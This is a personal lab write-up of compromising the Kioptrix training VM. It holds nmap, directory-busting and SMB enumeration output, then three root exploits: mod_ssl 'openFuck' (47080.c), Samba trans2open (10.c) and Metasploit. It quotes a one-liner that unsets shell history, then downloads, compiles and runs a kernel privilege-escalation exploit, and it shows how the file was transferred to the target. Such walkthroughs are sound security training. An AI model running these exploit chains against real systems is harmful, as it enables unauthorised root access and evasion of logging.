---
title: "Kioptrix"
tags:
  - fetus
---

## Exploitation Path:
```
version enumeration --> exploit finding --> exploitation
```
## nmap results:
```sh title:"Dscan.txt"
# Nmap 7.95 scan initiated Sun Aug 17 15:36:31 2025 as: /usr/lib/nmap/nmap -sCV -T4 -oN Dscan.txt 192.168.48.136
Nmap scan report for 192.168.48.136
Host is up (0.0019s latency).
Not shown: 994 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status
139/tcp   open  netbios-ssn Samba smbd (workgroup: wMYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
|_ssl-date: 2025-08-18T05:36:53+00:00; +10h00m03s from scanner time.
32768/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:46:9F:01 (VMware)

Host script results:
|_clock-skew: 10h00m02s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 17 15:36:50 2025 -- 1 IP address (1 host up) scanned in 18.85 seconds
```
## service enumeration and exploitation 
### [[SSH]] fix
```sh
ssh root@$ip -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -c aes128-cbc
```
- version enumeration didnt do anything
### [[HTTP]] enumeration
#### port 80:
- default apache page
- dirbusting results:
```sh title:"fresults.txt" fold
200      GET        8l       56w     1831c http://192.168.48.136/poweredby.png
MSG      0.000 feroxbuster::heuristics detected directory listing: http://192.168.48.136/manual/mod/ (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://192.168.48.136/manual/ (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://192.168.48.136/icons/ (Apache)
200      GET        6l       51w     3487c http://192.168.48.136/icons/apache_pb.gif
200      GET       86l      392w     2890c http://192.168.48.136/
301      GET        9l       27w      307c http://192.168.48.136/manual/mod/mod_perl => http://127.0.0.1/manual/mod/mod_perl/
301      GET        9l       27w      306c http://192.168.48.136/manual/mod/mod_ssl => http://127.0.0.1/manual/mod/mod_ssl/
200      GET      662l     1815w    27700c http://192.168.48.136/manual/mod/mod_perl.html
200      GET        3l       15w      462c http://192.168.48.136/icons/bomb.gif
200      GET        2l       16w      349c http://192.168.48.136/icons/c.gif
200      GET        2l       14w      297c http://192.168.48.136/icons/sound2.gif
200      GET        1l       16w      384c http://192.168.48.136/icons/world2.gif
200      GET        2l       14w      310c http://192.168.48.136/icons/forward.gif
200      GET        2l       15w      364c http://192.168.48.136/icons/alert.red.gif
200      GET        1l       13w      322c http://192.168.48.136/icons/transfer.gif
200      GET        2l       14w      289c http://192.168.48.136/icons/continued.gif
200      GET        2l       15w      354c http://192.168.48.136/icons/generic.sec.gif
200      GET        3l       14w     1773c http://192.168.48.136/icons/compressed.gif
200      GET        1l       14w      354c http://192.168.48.136/icons/binhex.gif
200      GET        1l       15w      355c http://192.168.48.136/icons/comp.gray.gif
200      GET        1l       12w      310c http://192.168.48.136/icons/hand.right.gif
200      GET        1l       16w      351c http://192.168.48.136/icons/ps.gif
200      GET        2l       17w      334c http://192.168.48.136/icons/text.gif
200      GET        3l       18w      357c http://192.168.48.136/icons/broken.gif
200      GET        1l       13w      264c http://192.168.48.136/icons/pie0.gif
200      GET        1l       15w      362c http://192.168.48.136/icons/pdf.gif
200      GET        2l       16w      458c http://192.168.48.136/icons/image2.gif
200      GET        1l       17w      360c http://192.168.48.136/icons/link.gif
200      GET        1l       17w      350c http://192.168.48.136/icons/movie.gif
200      GET        1l       16w      368c http://192.168.48.136/icons/screw1.gif
200      GET        1l       16w      371c http://192.168.48.136/icons/portal.gif
200      GET        2l       14w      264c http://192.168.48.136/icons/pie6.gif
200      GET        1l       13w      408c http://192.168.48.136/icons/sphere1.gif
200      GET        2l       15w      408c http://192.168.48.136/icons/box2.gif
200      GET        1l       13w      265c http://192.168.48.136/icons/pie7.gif
200      GET        1l       14w      345c http://192.168.48.136/icons/alert.black.gif
301      GET        9l       27w      299c http://192.168.48.136/icons/small => http://127.0.0.1/icons/small/
200      GET        2l       14w      341c http://192.168.48.136/icons/folder.sec.gif
200      GET        2l       13w      375c http://192.168.48.136/icons/box1.gif
200      GET        1l       12w      188c http://192.168.48.136/icons/blank.gif
200      GET        1l       14w      383c http://192.168.48.136/icons/sphere2.gif
200      GET        1l       12w      221c http://192.168.48.136/icons/right.gif
200      GET        1l       14w      271c http://192.168.48.136/icons/pie3.gif
200      GET        1l       13w      318c http://192.168.48.136/icons/folder.gif
200      GET        1l       13w      220c http://192.168.48.136/icons/up.gif
200      GET        1l       15w      413c http://192.168.48.136/icons/image3.gif
200      GET        2l       14w      265c http://192.168.48.136/icons/pie5.gif
200      GET        2l       17w      357c http://192.168.48.136/icons/unknown.gif
200      GET        1l       15w      306c http://192.168.48.136/icons/generic.red.gif
200      GET        2l       14w      275c http://192.168.48.136/icons/ball.red.gif
200      GET       16l       72w      898c http://192.168.48.136/manual/mod/
200      GET       14l       56w      643c http://192.168.48.136/manual/
200      GET        1l       15w      354c http://192.168.48.136/icons/burst.gif
200      GET        2l       15w      314c http://192.168.48.136/icons/hand.up.gif
200      GET        1l       13w      311c http://192.168.48.136/icons/tar.gif
200      GET        2l       15w      365c http://192.168.48.136/icons/a.gif
200      GET        1l       15w      358c http://192.168.48.136/icons/comp.blue.gif
200      GET        1l       18w      346c http://192.168.48.136/icons/sound1.gif
200      GET        1l       16w      340c http://192.168.48.136/icons/uu.gif
200      GET        1l       14w      363c http://192.168.48.136/icons/patch.gif
200      GET        1l       13w      383c http://192.168.48.136/icons/layout.gif
200      GET        1l       13w      279c http://192.168.48.136/icons/pie1.gif
200      GET        1l       14w      344c http://192.168.48.136/icons/p.gif
200      GET        1l       14w      414c http://192.168.48.136/icons/quill.gif
200      GET        1l       12w      223c http://192.168.48.136/icons/down.gif
200      GET        1l       14w      286c http://192.168.48.136/icons/pie2.gif
200      GET        1l       13w      326c http://192.168.48.136/icons/world1.gif
200      GET        3l       16w      359c http://192.168.48.136/icons/tex.gif
200      GET        2l       16w      351c http://192.168.48.136/icons/binary.gif
200      GET        2l       16w      334c http://192.168.48.136/icons/f.gif
200      GET        1l       13w      238c http://192.168.48.136/icons/pie8.gif
200      GET        1l       13w      297c http://192.168.48.136/icons/back.gif
200      GET        2l       16w      266c http://192.168.48.136/icons/pie4.gif
200      GET        3l       15w      395c http://192.168.48.136/icons/index.gif
200      GET        2l       16w      317c http://192.168.48.136/icons/generic.gif
200      GET        1l       18w      354c http://192.168.48.136/icons/script.gif
200      GET        1l       16w      340c http://192.168.48.136/icons/uuencoded.gif
200      GET        3l       15w      368c http://192.168.48.136/icons/screw2.gif
200      GET        1l       12w      224c http://192.168.48.136/icons/left.gif
200      GET        1l       14w      338c http://192.168.48.136/icons/dvi.gif
200      GET        1l       17w      312c http://192.168.48.136/icons/ball.gray.gif
200      GET        1l       13w      318c http://192.168.48.136/icons/dir.gif
200      GET        2l       15w      362c http://192.168.48.136/icons/folder.open.gif
200      GET        1l       12w      399c http://192.168.48.136/icons/image1.gif
200      GET       54l      292w    21800c http://192.168.48.136/icons/icon.sheet.gif
200      GET       89l      656w     9472c http://192.168.48.136/icons/
200      GET       86l      392w     2890c http://192.168.48.136/index.html
301      GET        9l       27w      294c http://192.168.48.136/manual => http://127.0.0.1/manual/
301      GET        9l       27w      292c http://192.168.48.136/mrtg => http://127.0.0.1/mrtg/
301      GET        9l       27w      293c http://192.168.48.136/usage => http://127.0.0.1/usage/
```
- nothing interesting
#### port 443:
- broken 
### mod_ssl manual exploitation
#### version enumeration 
- `mod_ssl/2.8.4` had an exploit called `openFuck`
```sh
searchsploit -m unix/remote/47080.c
```
- needs some dependencies to compile:
```sh
apt-get install libssl-dev
gcc 47080.c -o exploit -lcrypto
```
- now to use the exploit we need the offset for the specific OS so it can do the buffer overflow. for redhat using `mod_ssl/2.8.4` its `0x6b`
```sh
./exploit 0x6b $ip -c 45
```
- we get a shell as `apache` if we run it. the automatic priv esc doesnt work cuz it fails to get the priv esc script. we'll get the file on our machine and then transfer it to kioptrix at `/tmp` so it can actually run when we get the connection again. this is the error that points to the script being missing: 
```sh
bash-2.05$ unset HISTFILE; cd /tmp; wget https://dl.packetstormsecur-exploits/ptrace-kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rd.c; ./exploit; 
--02:57:36--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:443... connected!

Unable to establish SSL connection.

Unable to establish SSL connection.
gcc: ptrace-kmod.c: No such file or directory
gcc: No input files
rm: cannot remove `ptrace-kmod.c': No such file or directory
bash: ./exploit: No such file or directory
```
- run this on the local machine to get the file, compile it and set up a python http server for the transfer:
```sh
wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
python -m http.server 1337
```
- and then run this on kioptrix to [[wget]] the file:
```sh
wget http://192.168.48.128:1337/ptrace-kmod.c
```
- rerun the exploit after quitting and boom the box is rooted :D <br>
![[KioptrixRootedWithModSSLSS.png]]

### [[SMB - SAMBA]] enumeration
- smbmap didnt show anything
- `smbclient -L \\\\$ip\\ -N`:
```sh
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       IPC Service (Samba Server)
        ADMIN$          IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful

        Server               Comment
        ---------            -------
        KIOPTRIX             Samba Server

        Workgroup            Master
        ---------            -------
        MYGROUP              KIOPTRIX
```
- trying to access the shares doesnt work. needs a password
#### version enumeration
- nmap didnt have a version enum script 
- got it thorugh metasploit 
```sh
msf6 auxiliary(scanner/smb/smb_version) > run
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 192.168.48.136:139    -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.48.136        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
- the samba version is `2.2.1a` 
- metasploit has a buffer overflow module for it. theres an RCE exploit too at `multiple/remote/10.c`
### `10.c` manual exploitaion
- mirrored and compiled it
```sh
searchsploit -m multiple/remote/10.c
gcc 10.c -o 10
```
- `10.c` usage:
```sh
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
Usage: ./10 [-bBcCdfprsStv] [host]

-b <platform>   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)
-B <step>       bruteforce steps (default = 300)
-c <ip address> connectback ip address
-C <max childs> max childs for scan/bruteforce mode (default = 40)
-d <delay>      bruteforce/scanmode delay in micro seconds (default = 100000)
-f              force
-p <port>       port to attack (default = 139)
-r <ret>        return address
-s              scan mode (random)
-S <network>    scan mode
-t <type>       presets (0 for a list)
-v              verbose mode
```
- `./10 -b 0 -v -p 139 $ip`:<br>
![[KioptrixHasBeenRootedWith10cSS.png]]
- boom rooted :DDD
### [[metasploit_framework]] exploitation with trans2open
- the module didnt work initially. had to change the payload from meterpreter to a non staged normy reverse tcp shell. rooted tho :D <br>
![[KioptrixHasBeenRootedWithTrans2OpenSS.png]]
























# ==REDUNDANT==
## [[nmap]] results:

```zsh title:"nmap -sV -O" fold
┌──(root㉿kali)-[~]
└─# nmap -sV -O 192.168.0.107 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-16 08:18 EDT
Nmap scan report for 192.168.0.107
Host is up (0.0046s latency).
Not shown: 994 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:FE:F6:F7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|media device
Running: Linux 2.4.X, Roku embedded
OS CPE: cpe:/o:linux:linux_kernel:2.4 cpe:/h:roku:soundbridge_m1500
OS details: Linux 2.4.9 - 2.4.18 (likely embedded), Roku HD1500 media player
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.61 seconds
```

```zsh title:"nmap -A" fold
┌──(root㉿kali)-[~]
└─# nmap -A 192.168.0.107       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-16 08:02 EDT
Nmap scan report for 192.168.0.107
Host is up (0.0059s latency).
Not shown: 994 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
|_ssl-date: 2025-03-16T17:02:41+00:00; +5h00m00s from scanner time.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_http-title: 400 Bad Request
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:FE:F6:F7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: 4h59m59s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   5.88 ms 192.168.0.107

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.44 seconds

```

```zsh title:"nmap --script=safe" fold
┌──(root㉿kali)-[~]
└─# nmap --script=safe 192.168.0.107
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-16 10:33 EDT
No profinet devices in the subnet
Pre-scan script results:
|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
|_multicast-profinet-discovery: 0
| broadcast-netbios-master-browser: 
|_ip  server  domain
| broadcast-igmp-discovery: 
|   192.168.0.1
|     Interface: eth0
|     Version: 2
|     Group: 224.0.0.2
|     Description: All Routers on this Subnet
|   192.168.0.1
|     Interface: eth0
|     Version: 2
|     Group: 224.0.0.22
|     Description: IGMP
|   192.168.0.100
|     Interface: eth0
|     Version: 2
|     Group: 224.0.0.251
|     Description: mDNS (rfc6762)
|   192.168.0.103
|     Interface: eth0
|     Version: 2
|     Group: 224.0.0.252
|     Description: Link-local Multicast Name Resolution (rfc4795)
|_  Use the newtargets script-arg to add the results as targets
| targets-asn: 
|_  targets-asn.asn is a mandatory parameter
|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
| broadcast-dhcp-discover: 
|   Response 1 of 1: 
|     Interface: eth0
|     IP Offered: 192.168.0.104
|     Server Identifier: 192.168.0.1
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.0.1
|_    Domain Name Server: 192.168.0.1
| broadcast-upnp-info: 
|   239.255.255.250
|       Server: Linux/2.6.36, UPnP/1.0, Portable SDK for UPnP devices/1.6.19
|_      Location: http://192.168.0.1:1900/gatedesc.xml
| broadcast-ping: 
|   IP: 192.168.0.107  MAC: 08:00:27:fe:f6:f7
|_  Use --script-args=newtargets to add the results as targets
|_eap-info: please specify an interface with -e
| broadcast-listener: 
|   ether
|       ARP Request
|         sender ip    sender mac         target ip
|         192.168.0.1  6c:5a:b0:44:7d:e6  192.168.0.103
|   udp
|       SSDP
|         ip             uri
|         192.168.0.100   urn:dial-multiscreen-org:service:dial:1
|       DHCP
|         srv ip       cli ip         mask           gw           dns          vendor
|_        192.168.0.1  192.168.0.104  255.255.255.0  192.168.0.1  192.168.0.1  -
Nmap scan report for 192.168.0.107
Host is up (0.024s latency).
Not shown: 994 closed tcp ports (reset)
Bug in http-security-headers: no string output.
PORT      STATE SERVICE
22/tcp    open  ssh
| ssh2-enum-algos: 
|   kex_algorithms: (2)
|   server_host_key_algorithms: (2)
|   encryption_algorithms: (11)
|   mac_algorithms: (6)
|_  compression_algorithms: (2)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
|_banner: SSH-1.99-OpenSSH_2.9p2
80/tcp    open  http
| http-headers: 
|   Date: Sun, 16 Mar 2025 19:35:10 GMT
|   Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|   Last-Modified: Thu, 06 Sep 2001 03:12:46 GMT
|   ETag: "8805-b4a-3b96e9ae"
|   Accept-Ranges: bytes
|   Content-Length: 2890
|   Connection: close
|   Content-Type: text/html
|   
|_  (Request type: HEAD)
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| http-comments-displayer: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.0.107
|     
|     Path: http://192.168.0.107:80/
|     Line number: 6
|     Comment: 
|_        <!-- Background white, links blue (unvisited), navy (visited), red (active) -->
|_http-xssed: No previously reported XSS vuln.
|_http-mobileversion-checker: No mobile version detected.
|_http-trace: TRACE is enabled
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
|_http-date: Sun, 16 Mar 2025 19:35:10 GMT; +4h59m59s from local time.
| http-methods: 
|_  Potentially risky methods: TRACE
| http-grep: 
|   (1) http://192.168.0.107:80/: 
|     (1) email: 
|_      + webmaster@example.com
111/tcp   open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status
139/tcp   open  netbios-ssn
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
443/tcp   open  https
| http-useragent-tester: 
|   Status for browser useragent: 400
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
|_http-title: 400 Bad Request
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
|_http-date: Sun, 16 Mar 2025 19:34:44 GMT; +5h00m00s from local time.
|_http-comments-displayer: Couldn't find any comments.
|_http-xssed: No previously reported XSS vuln.
| http-headers: 
|   Date: Sun, 16 Mar 2025 19:34:45 GMT
|   Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|   Connection: close
|   Content-Type: text/html; charset=iso-8859-1
|   
|_  (Request type: GET)
|_http-mobileversion-checker: No mobile version detected.
|_http-fetch: Please enter the complete path of the directory to save data in.
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA
|     References:
|       https://www.securityfocus.com/bid/70574
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|_      https://www.openssl.org/~bodo/ssl-poodle.pdf
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
| http-security-headers: 
|   Strict_Transport_Security: 
|_    HSTS not configured in HTTPS Server
| ssl-dh-params: 
|   VULNERABLE:
|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)
|     State: VULNERABLE
|     IDs:  BID:74733  CVE:CVE-2015-4000
|       The Transport Layer Security (TLS) protocol contains a flaw that is
|       triggered when handling Diffie-Hellman key exchanges defined with
|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
|       to downgrade the security of a TLS session to 512-bit export-grade
|       cryptography, which is significantly weaker, allowing the attacker
|       to more easily break the encryption and monitor or tamper with
|       the encrypted stream.
|     Disclosure date: 2015-5-19
|     Check results:
|       EXPORT-GRADE DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: mod_ssl 2.0.x/512-bit MODP group with safe prime modulus
|             Modulus Length: 512
|             Generator Length: 8
|             Public Key Length: 512
|     References:
|       https://weakdh.org
|       https://www.securityfocus.com/bid/74733
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000
|   
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: mod_ssl 2.0.x/1024-bit MODP group with safe prime modulus
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
|_ssl-date: 2025-03-16T19:34:41+00:00; +5h00m01s from scanner time.
|_http-referer-checker: Couldn't find any cross-domain scripts.
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140605.txt
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|_      http://www.cvedetails.com/cve/2014-0224
32768/tcp open  status
MAC Address: 08:00:27:FE:F6:F7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 4h59m59s, deviation: 1s, median: 4h59m59s
| unusual-port: 
|_  WARNING: this script depends on Nmap's service/version detection (-sV)
| dns-blacklist: 
|   SPAM
|     all.spamrats.com - FAIL
|_    l2.apews.org - FAIL
| qscan: 
| PORT   FAMILY  MEAN (us)  STDDEV     LOSS (%)
| 1      0       43640.10   104558.68  0.0%
| 22     0       23910.40   57317.19   0.0%
| 80     0       25343.80   58214.62   0.0%
| 111    0       122908.70  220747.35  0.0%
| 139    0       42953.80   76855.78   0.0%
| 443    0       7396.90    3314.99    0.0%
|_32768  0       124043.50  301289.45  0.0%
|_ipidseq: All zeros
|_msrpc-enum: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]
|_smb2-capabilities: SMB 2+ not supported
| port-states: 
|   tcp: 
|     open: 22,80,111,139,443,32768
